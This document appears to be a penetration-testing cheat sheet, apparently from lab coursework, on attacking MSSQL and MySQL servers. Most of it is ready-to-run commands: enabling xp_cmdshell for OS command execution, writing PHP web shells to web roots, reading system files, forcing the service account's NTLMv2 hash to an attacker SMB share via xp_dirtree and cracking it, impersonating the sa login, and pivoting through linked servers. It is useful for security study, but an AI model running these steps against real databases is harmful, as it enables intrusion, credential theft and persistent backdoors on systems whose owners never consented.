## Attacking SQL Databases
```bash
# MSSQL : TCP/1433, UDP/1434 | TCP/2433 in HIDDEN mode 
# MYSQL : TCP/3306

nmap -Pn -sV -sC -p1433,1434,2433,3306 10.10.10.125 # enum

## Authentication Mechanisms
  # MSSQL : 1- Windows authentication mode : windows/domain accounts
            2- Mixed mode : windows/domain accounts + SQL server accounts
  # MYSQL : different authentication methods, such as username and password, as windows 
--------------------------------------------------------------------------------
# Misconfigurations
- MySQL 5.6.x #=>  CVE-2012-2122 timing attack , receive a response indicating that the correct password was found, even though it was not.
- anonymous login or user/machine without password
--------------------------------------------------------------------------------
# Protocol Specific Attacks

## Read/Change the Database

### Connecting to MYSQL 
mysql -u julio -pPassword123 -h 10.129.20.13 

#### connect to MSSQL  (mixed mode (use the sql server to auth))
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30 -C # connect to MSSQL 
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h # conect to MSSQL
impacket-mssqlclient -p 1433 julio@10.129.203.7

#### connect to MSSQL server (windows auth mode)
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h # local windows auth
sqsh -S 10.129.203.7 -U <domain_name>\\julio -P 'MyPassword!' -h # domain auth

### SQL Default Databases:
# MySQL 
mysql # system data
information_schema # metadata
performance_schema # low-level monitoring
sys # views for performance_schema

# MSSQL 
master # server-wide info
msdb # SQL Agent jobs
model # template for new DBs
resource # system objects
tempdb # temp data & objects

### SQL Syntax

#  Show Databases
  SHOW DATABASES; # mysql 

  SELECT name FROM master.dbo.sysdatabases
  GO # sqlcmd

#  Select a Database 
  USE <db>; # mysql

  USE htbusers
  GO         # sqlcmd

# show tables 
  SHOW TABLES; # mysql

  SELECT table_name FROM <db>.INFORMATION_SCHEMA.TABLES
  GO          # sqlcmd
  
# Select all Data from Table "users" 
  SELECT * FROM users; # mysql
  
  SELECT * FROM users 
  GO          # sqlcmd

-----------------------------------
## Execute Commands

ON MSSQL :
  ### XP_CMDSHELL
    xp_cmdshell 'whoami'
    GO                   # sqlcmd

  [+] # if XP_CMDSHELL is not enable we can enable it by :
  # To allow advanced options to be changed.  
  EXECUTE sp_configure 'show advanced options', 1
  GO
  # To update the currently configured value for advanced options.  
  RECONFIGURE
  GO  
  # To enable the feature.  
  EXECUTE sp_configure 'xp_cmdshell', 1
  GO  
  # To update the currently configured value for this feature.  
  RECONFIGURE
  GO
  [!] #There are other methods to get command execution:  adding extended stored procedures, CLR Assemblies, SQL Server Agent Jobs, and external scripts. However, besides those methods there are also additional functionalities that can be used like the xp_regwrite command that is used to elevate privileges by creating new entries in the Windows registry. Nevertheless, those methods are outside the scope of this module.

ON MYSQL :
  MySQL supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this GitHub repository(https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.
----------------------------------------
## Write Local Files
  ### MySQL
  SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

  show variables like "secure_file_priv"; # chck if we have priv to write file
  [!] secure_file_priv system varibale set the priv of export/import such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the LOAD_FILE() function.:
     if empty : no secure setting 
     if set the directory : the server limite the export/import in that directory 
     if set to NULL : the server disable the import/export operation  
  
  ### MSSQL
# we need to enable Ole Automation Procedures, which requires admin privileges
  # Enable Ole Automation Procedures
  sp_configure 'show advanced options', 1
  GO
  RECONFIGURE
  GO
  sp_configure 'Ole Automation Procedures', 1
  GO
  RECONFIGURE
  GO

  # Create a File:
  1> DECLARE @OLE INT
  2> DECLARE @FileID INT
  3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
  4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
  5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
  6> EXECUTE sp_OADestroy @FileID
  7> EXECUTE sp_OADestroy @OLE
  8> GO
-------------------------------------------
## Read Local Files

  #  MSSQL
  1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
  2> GO
  
  # MySQL 
  # if we have appropriate priv (setting in secure_file_priv varibale):
  select LOAD_FILE("/etc/passwd");  # read file system
--------------------------------------------
## Capture MSSQL Service Hash
# we can steal the MSSQL service account hash by executing the xp_subdirs or xp_dirtree undocumented stored procedures
# which use the SMB protocol to access the shared folder 
# and force it to authenticat with the NTLMv2 mssql service account 

  1 # first to start Responder or impacket-smbserver 
  sudo responder -I tun0
  sudo impacket-smbserver share ./ -smb2support

  2 # run XP_DIRTREE and XP_SUBDIRS  
  
  1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
  2> GO
  1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
  2> GO

  3 # crack the hash 
  hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 

----------------------------------------------
## Impersonate Existing Users with MSSQL
# SQL Server has a special permission, named "IMPERSONATE", that allows the executing user to take on the permissions of another user or login  

0-# move to the master DB
# It is recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database
  USE master

1-# Identify Users that We Can Impersonate
[+] # Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned

  1> SELECT distinct b.name
  2> FROM sys.server_permissions a
  3> INNER JOIN sys.server_principals b
  4> ON a.grantor_principal_id = b.principal_id
  5> WHERE a.permission_name = 'IMPERSONATE'
  6> GO
  name
  ---------
  sa
  ben
  valentin
  
2-# Verifying our Current User and Role
  1> SELECT SYSTEM_USER
  2> SELECT IS_SRVROLEMEMBER('sysadmin')
  3> go
  -----------
  julio                                                                            -----------
          0   #=> 0 indicates, we do not have the sysadmin role
[+] # we dont have sysadmin role ,but we can impersnate "sa" user.

3-# Impersonating the SA User
  1> EXECUTE AS LOGIN = 'sa'
  2> SELECT SYSTEM_USER
  3> SELECT IS_SRVROLEMEMBER('sysadmin')
  4> GO
  -----------
  sa
  -----------
          1 #=> 1 indicates, we do have the sysadmin role 

[!] # If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.    
-------------------------------------------------------------------------------
## Communicate with Other Databases with MSSQL

# `MSSQL` has a configuration option called linked servers. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.
# If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server.
# Administrators can configure a linked server using credentials from the remote server
# If those credentials have sysadmin privileges, we may be able to execute commands in the remote SQL instance.

  ### Identify linked Servers in MSSQL
  1> SELECT srvname, isremote FROM sysservers
  2> GO

  srvname                             isremote
  ----------------------------------- --------
  DESKTOP-MFERMN4\SQLEXPRESS          1        # remote server
  10.0.0.12\SQLEXPRESS                0        # linked server

  ### identify the user used for the connection and its privileges
  1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
  2> GO
  --------------------------  ----------------------------------------  ------
  DESKTOP-0L9D4KA\SQLEXPRESS  Microsoft SQL Server 2019 (RTM sa_remote    1
  
#> now We can read data from any database or execute system commands with xp_cmdshell
```


##  Latest SQL Vulnerabilities 

```bash
## Capture MSSQL Service Hash 

# 1 # first to start Responder or impacket-smbserver 
sudo responder -I tun0 
# or
sudo impacket-smbserver share ./ -smb2support 2

# run XP_DIRTREE and XP_SUBDIRS 
1> EXEC master..xp_dirtree '\\10.10.110.17\share\' 
2> GO
```


